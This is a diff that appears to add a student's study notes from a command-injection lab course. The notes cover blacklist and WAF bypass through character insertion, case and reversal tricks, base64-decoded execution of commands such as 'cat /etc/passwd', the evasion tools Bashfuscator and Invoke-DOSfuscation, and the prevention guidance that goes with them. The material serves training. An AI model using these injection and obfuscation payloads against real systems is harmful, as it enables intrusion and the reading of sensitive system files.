@@ -98,15 +98,131 @@ $env:HOMEPATH[0]
 ``` 
 to get a character
 
+Similar to Linux we can get all environment variable using `Get-ChildItem Env:`
+
+We can also use character shifting to achieve the same result. 
+We can use this command `$(tr '!-}' '"-~'<<<[)` to shift a character by one. So we could find the character right before the one we want and then shift it over. 
+
+This is for linux, its much harder on Windows.
+
+The question in this section is:
+Use what you learned in this section to find name of the user in the '/home' folder. What user did you find? 
+
+I first ran `127.0.0.1%0a%09printenv` to get the environment variables, then I ran: `127.0.0.1%0a%09ls%09${PATH:0:1}home` to get the answer
+
 ## Bypassing Blacklisted Commands
+
+If there is a command blacklist, we can attempt to bypass this by adding specific characters in our strings that don't affect the integrity of the command. 
+
+In both Linux and Windows we can use quotes (single or double) anywhere in a command and it will work the same way, as long as there are an even number of them.
+
+So running wh"oam"i is the same as whoami.
+
+In Linux, we can also use \ and $@ anywhere in the string, and it can be any number and not affect the integrity.
+
+In Windows we can use ^ and the same is true.
+
+The question in this section is:
+Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.
+
+Last time we used `127.0.0.1%0a%09ls%09${PATH:0:1}home` to get the answer.
+So I tried `127.0.0.1%0a%09"l"s%09${PATH:0:1}home`
+
+This showed the same folder. So running `127.0.0.1%0a%09"l"s%09-al%09${PATH:0:1}home${PATH:0:1}1nj3c70r` finds there is a flag.txt.in that directory.
+
+Then running `127.0.0.1%0a%09'c'at%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt` gets the answer.
 
 ## Advanced Command Obfuscation
 
+Advanced command obfuscation covers a lot of techniques we can use to potentially bypass a WAF. 
+
+First we can try to use case manipulation (e.g. WhOaMi). In Windows this works as is because Powershell and CMD are case agnostic. However in Linux we would need to write a command that converts those characters back to lower case before it works. 
+
+That could look like: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` except this would not work in our case because it has space characters in it. So for our request we could use something like:
+`127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")` and that would work.
+
+There are other options for converting the characters, this is just one example.
+
+Another option we can try is to reverse the command then re-reverse it before execution.
+
+For instance if we ran `127.0.0.1%0a$(rev<<<'imaohw')` would work just like running whoami
+
+In windows we can do the same thing using `iex "$('imaohw'[-1..-20] -join '')"`, iex runs a reversed command.
+
+Finally we can attempt to encode our commands before sending to the server then decode.
+
+For instance we can encode a command like this `echo -n 'cat /etc/passwd | grep 33' | base64`
+
+Then pass it to the server like this: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
+
+We are using <<< instead of | because the pipe is filtered.
+
+Even if some commands were filtered, like bash or base64, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like sh for command execution and openssl for b64 decoding, or xxd for hex decoding.
+
+We can do the same thing in Windows like:
+`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
+
+Then we can decode like:
+`iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
+
+There are also tools that we can use to automatically obfuscate our commands, we see those in the next section.
+
+The question for this section is:
+Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 
+
+So the first thing I did was convert it to base64 like:
+`echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64`
+
+That string was ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
+
+Then I passed `bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)` to the input like:
+`ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)`
+
+This got the answer.
+
 ## Evasion tools
+
+One Linux tool we can use for obfuscation is Bashfuscator. We clone the tool here:
+`https://github.com/Bashfuscator/Bashfuscator`
+
+Then we can `
+run pip3 install setuptools==65
+python3 setup.py install --user
+`
+
+Then we can run the command like `./bashfuscator -c 'cat /etc/passwd'` this will run the command with a random obfuscation technique.
+
+However, this can cause the command output to be over a million characters. So we can add some other flags to make this better.
+
+`./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`
+
+For windows we can use D)Sfuscation, which can be found here: `https://github.com/danielbohannon/Invoke-DOSfuscation`
+
+To run this we can do: 
+``` Powershell
+PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+PS C:\htb> cd Invoke-DOSfuscation
+PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
+PS C:\htb> Invoke-DOSfuscation
+```
 
 # Prevention
 
 ## Command Injection Prevention
+
+First we should always try to use built in functions that perform the functionality we want and system commands, as many back-end languages have this in a way that is not exploitable. For instance instead of ping, we can use fsockopen in php.
+
+If we cannot do that, we should never directly use user input to perform functionality. It should be sanatized on the backend and should be run with the least priviliges possible.
+
+Regardless of how we are running the code we should always validate and sanatize input.
+
+Validate means to make sure its in the expected format.
+
+Sanatize means to remove potentially dangerous characters.
+
+Sanatization should always happen after validation.
+
+Finally, we should make sure our server is configured correctly to minimize impact of a compromized server.
 
 # Skills Assessment
 
